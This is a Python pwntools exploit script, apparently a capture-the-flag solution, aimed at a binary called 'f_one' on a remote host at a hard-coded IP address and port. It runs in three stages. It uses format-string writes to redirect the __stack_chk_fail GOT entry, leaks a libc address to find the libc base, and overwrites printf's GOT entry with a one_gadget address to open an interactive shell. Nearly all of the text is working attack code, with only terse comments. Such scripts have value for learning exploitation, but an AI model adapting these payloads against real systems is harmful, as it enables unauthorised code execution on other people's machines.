from pwn import *

exe = ELF('../f_one_patched')
libc = ELF('../libc6_2.27-3ubuntu1.2_amd64.so')
# context.log_level = 'debug'

# p = process("../f_one_patched")
p = connect('142.93.228.122', 1111)

#####################################################
### Stage 1: Overwrite stack_check_fail to vuln() ###
### and leak some address						  ###
#####################################################
libc_start_main_ret_offset = 0x021b97
one_gadget_offset = 0x4f3c2
stack_chk_fail_offset = 56 		# if 56, '\n' will go to stack_chk_fail
stack_chk_fail_got = exe.got['__stack_chk_fail']	#0x600ba0
# exe_vuln_func = 0x4006b7
# stack_chk_fail_fmtstr_offset = 13
# libc_start_main_ret_fmtstr_offset = 17

payload1 = b'%c'*10
payload1 += b'%1709c%hn'	# Overwrite stack_chk_fail
payload1 += b'%17$p'		# leak libc_start_main_ret address
payload1 = payload1.ljust(stack_chk_fail_offset-8, b'P')
payload1 += p64(stack_chk_fail_got)

p.recvuntil(b'thing:')
p.sendline(payload1)
p.recvline()
libc_start_main_ret_addr = int(p.recvline().split(b'0x')[1][:12], 16)
libc_base = libc_start_main_ret_addr - libc_start_main_ret_offset
one_gadget_addr = libc_base + one_gadget_offset
print('[+] Leak libc_start_main_ret address:' + hex(libc_start_main_ret_addr))
print('[*] Libc base: ' + hex(libc_base))
print('[*] one_gadget address: ' + hex(one_gadget_addr))

####################################################
### Stage 2: Overwrite printf (not fgets         ###
### because we will need to input more thing) to ###
### one_gadget                                   ###
####################################################
printf_got = exe.got['printf']			# 0x600ba8
printf_got_1 = printf_got+1

payload2 = b'%c'*9
payload2 += '%{}c%hhn'.format(int(hex(one_gadget_addr)[-2:], 16)-9).encode()
payload2 += '%{}c%hn'.format( int(hex(one_gadget_addr)[-6:-2], 16) - int(hex(one_gadget_addr)[-2:], 16) ).encode()
payload2 = payload2.ljust(stack_chk_fail_offset-8-8, b'P')
payload2 += p64(printf_got)
payload2 += b'\x00'*8
payload2 += p64(printf_got_1)

p.sendline(payload2)

########################################################
### Stage 3: Add \x00 to make sure $rsp+0x40 is null ###
########################################################
payload3 = b'\x00'*0x50

p.recvuntil(b'thing:')
p.sendline(payload3)

p.interactive()
